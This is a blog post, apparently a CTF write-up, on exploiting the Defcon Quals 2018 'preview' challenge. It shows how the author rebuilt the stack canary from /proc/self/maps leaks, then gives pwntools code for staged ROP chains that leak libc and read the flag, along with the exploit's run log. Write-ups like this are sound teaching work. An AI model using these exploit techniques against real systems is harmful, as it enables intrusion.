@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Defcon Quals 2018 - ddtek: Preview | kileak</title>
+
+
+
+
+
+<meta name="description" content="Defcon Quals 2018 - ddtek: Preview">
+
+
+<meta name="keywords" content="defcon">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/defconquals18-preview/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Defcon Quals 2018 - ddtek: Preview</h1>
+      <p class="post-meta">May 14, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Defcon Quals 2018 - ddtek: Preview
+<!--break--></p>
+
+  <p>Team: Samurai</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/preview/preview">preview</a> <a href="https://kileak.github.io/assets/preview/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/preview/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/preview/pow.py">pow.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Welcome to preview 0.1
+Standing by for your requests</code></pre></figure>
+
+<p>I didn’t really bother reversing this binary, but directly started it up in <code class="language-plaintext highlighter-rouge">gdb</code> and analyzed it (which worked out pretty well)…</p>
+
+<p>The binary itself is obfuscated, and builds up the real binary into a mapped area and runs it from there.</p>
+
+<p>Within gdb one could easily spot, that the binary checked, if our input starts with <code class="language-plaintext highlighter-rouge">HEAD</code>, so when playing around with <code class="language-plaintext highlighter-rouge">HEAD</code> it quickly occured, that it will output the first 7 lines of a file.</p>
+
+<p>If the file, we’re trying to preview is shorter than 7 lines, it will just tell us, that <code class="language-plaintext highlighter-rouge">That resource is not very interesting, feel free to select another</code> (so it cannot be used to just print the flag ;))</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Welcome to preview 0.1
+Standing by for your requests
+HEAD flag
+That resource is not very interesting, feel free to select another
+
+HEAD /proc/self/maps
+Here's your preview:
+117178c000-117178e000 r-xp 00000000 00:00 0 
+117198d000-117198e000 r--p 00000000 00:00 0 
+117198e000-117198f000 rw-p 00000000 00:00 0 
+1a2e1fd000-1a2e223000 r-xp 00000000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+1a2e422000-1a2e423000 r--p 00025000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+1a2e423000-1a2e424000 rw-p 00026000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+1a2e424000-1a2e425000 rw-p 00000000 00:00 0 </code></pre></figure>
+
+<p>Feeding it with a longer string will trigger a buffer overflow, but since the binary uses canaries, it will detect stack smashing:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+Malformed request
+*** stack smashing detected ***: ./preview terminated</code></pre></figure>
+
+<p>Didn’t find a way to leak the canary, since overflowing into the canary would immediately crash the binary.</p>
+
+<p>But when checking the canary in gdb, something struck my mind :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x1a2e1fd117178c00 
+RBX: 0x0 
+RCX: 0x7f1ca8759290 --&gt; 0x3173fffff0013d48 
+RDX: 0x7f1ca8a28780 --&gt; 0x0 
+RSI: 0x7f1ca8a276a3 --&gt; 0xa28780000000000a 
+RDI: 0x1 
+RBP: 0x7ffd1def2a50 --&gt; 0x7ffd1def2a80 --&gt; 0x117178d050 --&gt; 0x41ff894156415741 
+RSP: 0x7ffd1def29d0 --&gt; 0x7f1ca8a276a3 --&gt; 0xa28780000000000a 
+RIP: 0x117178cfd6 --&gt; 0x282504334864 
+R8 : 0x7f1ca8660700 (0x00007f1ca8660700)
+R9 : 0x7f1ca8660700 (0x00007f1ca8660700)
+R10: 0x7f1ca8660700 (0x00007f1ca8660700)
+R11: 0x246 
+R12: 0x117178cae0 --&gt; 0x89485ed18949ed31 
+R13: 0x7ffd1def2b60 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x117178cfcc:  call   0x117178c9e0
+   0x117178cfd1:  nop
+   0x117178cfd2:  mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x117178cfd6:  xor    rax,QWORD PTR fs:0x28
+   0x117178cfdf:  je     0x117178cfe6
+   0x117178cfe1:  call   0x117178ca00
+   0x117178cfe6:  leave  
+   0x117178cfe7:  ret
+[------------------------------------stack-------------------------------------]</code></pre></figure>
+
+<p>The canary here is <code class="language-plaintext highlighter-rouge">0x1a2e1fd117178c00</code>. I have seen this pattern somewhere already!!!</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">HEAD /proc/self/maps
+Here's your preview:
+117178c000-117178e000 r-xp 00000000 00:00 0 
+117198d000-117198e000 r--p 00000000 00:00 0 
+117198e000-117198f000 rw-p 00000000 00:00 0 
+1a2e1fd000-1a2e223000 r-xp 00000000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+1a2e422000-1a2e423000 r--p 00025000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+1a2e423000-1a2e424000 rw-p 00026000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+1a2e424000-1a2e425000 rw-p 00000000 00:00 0 </code></pre></figure>
+
+<p>Spotted it, too?</p>
+
+<p>The canary starts with the first half of the starting address of the <code class="language-plaintext highlighter-rouge">r-xp</code> section of <code class="language-plaintext highlighter-rouge">ld-2.23.so</code>. And the beginning of the <code class="language-plaintext highlighter-rouge">r-xp</code> section of the <code class="language-plaintext highlighter-rouge">mapped</code> section (which is the binary) forms the second half.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">1a2e1fd000-1a2e223000 r-xp 00000000 fc:00 3412499                        /lib/x86_64-linux-gnu/ld-2.23.so
+117178c000-117178e000 r-xp 00000000 00:00 0 </code></pre></figure>
+
+<p>So, we can construct the canary for ourself by reading <code class="language-plaintext highlighter-rouge">/proc/self/maps</code>, parsing the output and take those segments from the memory map</p>
+
+<p><code class="language-plaintext highlighter-rouge">Canary = 1a2e1fd + 117178c + 00</code></p>
+
+<p>Let’s prepare leaking the addresses from <code class="language-plaintext highlighter-rouge">/proc/self/maps</code>, which we’ll need anyways and building that canary:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"requests</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak pie and canary from /proc/self/maps"</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"HEAD /proc/self/maps"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  
+  <span class="c1"># Canary = first 7 chars from rx in ld and first 7 char from rx mapped
+</span>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="s">"r-xp"</span> <span class="ow">in</span> <span class="n">line</span> <span class="ow">and</span> <span class="s">"/lib"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+      <span class="n">CANARY1</span> <span class="o">=</span> <span class="n">line</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
+    <span class="k">elif</span> <span class="s">"r-xp"</span> <span class="ow">in</span> <span class="n">line</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s">"/lib"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+      <span class="n">CANARY2</span> <span class="o">=</span> <span class="n">line</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
+      <span class="n">PIE</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"-"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+  <span class="n">CANARY</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">CANARY1</span><span class="o">+</span><span class="n">CANARY2</span><span class="o">+</span><span class="s">"00"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+  <span class="n">PIE</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">PIE</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+  <span class="n">BSS</span> <span class="o">=</span> <span class="n">PIE</span> <span class="o">+</span> <span class="mh">0x202000</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] CANARY               : 0x387fac19439d6100
+[*] BSS                  : 0x9439f63000
+[*] PIE                  : 0x9439d61000</code></pre></figure>
+
+<p>With the canary at hand, we now can safely overflow the buffer, preparing a ropchain and call it.</p>
+
+<p>For the final exploit I used a stager ropchain, which would</p>
+
+<ul>
+  <li>read another ropchain to the <code class="language-plaintext highlighter-rouge">bss</code> and stack pivot there</li>
+  <li>this one leaks libc and reads… yes another ropchain</li>
+  <li>the final ropchain then simply open/read/writes the flag</li>
+</ul>
+
+<p>There was also an <code class="language-plaintext highlighter-rouge">rwx</code> section mapped, containing shellcode, which could have been used for this, but I just sticked to ropping.</p>
+
+<p><code class="language-plaintext highlighter-rouge">open</code>/<code class="language-plaintext highlighter-rouge">read</code>/<code class="language-plaintext highlighter-rouge">write</code> got plus some rop gadgets are all we need:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"># Got entries for open/read/write
+OPEN = BSS + 0x80
+READ = BSS + 0x60
+WRITE = BSS + 0x28  
+
+# Rop gadgets
+POPRBP = PIE + 0xb40
+LEAVE = PIE + 0xc89
+
+# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
+SETGAD = PIE + 0x10AA
+
+# mov rdx, r13; mov rsi, r14; mov edi, r15
+CALLGAD = PIE + 0x1090</code></pre></figure>
+
+<p>So, first let’s read another ropchain to the bss and pivot the stack there:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">def call_func(func, rdi, rsi, rdx, rbx=0, rbp=1):
+  global SETGAD, CALLGAD
+
+  payload = p64(SETGAD)
+  payload += p64(rbx)
+  payload += p64(rbp)
+  payload += p64(func)
+  payload += p64(rdx)   # r13
+  payload += p64(rsi)   # r14
+  payload += p64(rdi)   # r15
+  payload += p64(CALLGAD)
+  payload += p64(0xdeadbeef)
+  payload += p64(rbx)
+  payload += p64(rbp)
+  payload += p64(func)
+  payload += p64(rdx)   # r13
+  payload += p64(rsi)   # r14
+  payload += p64(rdi)   # r15
+
+  return payload
+
+def exploit(r):
+  ...
+
+  log.info("Read ropchain to bss and stack pivot to bss")
+
+  payload = "A"*(88)
+  payload += p64(CANARY)
+  payload += p64(BSS)
+  payload += call_func(READ, 0, BSS+0x100, 1000)
+  payload += p64(POPRBP)
+  payload += p64(BSS+0x100)
+  payload += p64(LEAVE)
+
+  r.sendline(payload)</code></pre></figure>
+
+<p>We use the second ropchain to print out <code class="language-plaintext highlighter-rouge">write</code> got to leak libc address and read another ropchain.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak write got and read another ropchain to bss"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">WRITE</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">WRITE</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BSS</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRBP</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LEAVE</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">WRITEADD</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">WRITEADD</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"write"</span><span class="p">]</span>
+  
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"WRITE           : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">WRITEADD</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC            : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>Armed with this, we can now do the final ropchain.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send final ropchain to open/read/write flag"</span><span class="p">)</span>
+
+<span class="n">POPRAX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000033544</span>
+<span class="n">POPRDI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000021102</span>
+<span class="n">POPRSI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000202e8</span>
+<span class="n">POPRDX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000001b92</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000bc375</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">176</span>
+  
+<span class="c1"># open("./flag")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># read(3, bss+0x300, 100)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x300</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># write(1, bss+0x300, 100)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x300</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"./flag</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Might have also just put this into two ropchains, but it worked out pretty quickly and there were still more challenges to do, than cleaning up an already working exploit :-)</p>
+
+<p>So, here you go:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/vagrant/Challenges/dc18/preview/preview'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/vagrant/Challenges/dc18/preview/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to cee810fa.quals2018.oooverflow.io on port 31337: Done
+[+] Starting local process './pow.py': pid 1544
+[*] Stopped process './pow.py' (pid 1544)
+[*] Leak pie and canary from /proc/self/maps
+[*] CANARY               : 0xca98baf736e0e700
+[*] BSS                  : 0x736e2e9000
+[*] PIE                  : 0x736e0e7000
+[*] SETGAD               : 0x736e0e80aa
+[*] CALLGAD              : 0x736e0e8090
+[*] Read ropchain to bss and stack pivot to bss
+[*] Leak write got and read another ropchain to bss
+[*] WRITE           : 0x7fbb8a99a2b0
+[*] LIBC            : 0x7fbb8a8a3000
+[*] Send final ropchain to open/read/write flag
+[*] Switching to interactive mode
+OOO{ZOMG, WhAT iF order-of-the-overfow IS ddtek?!?!?!? Plot Twist!}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Defcon Quals 2018 - ddtek: Preview&amp;url=https://kileak.github.io/ctf/2018/defconquals18-preview/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/defconquals18-preview/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/defconquals18-preview';
+        var disqus_title = 'Defcon Quals 2018 - ddtek: Preview';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/defconquals18-preview';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
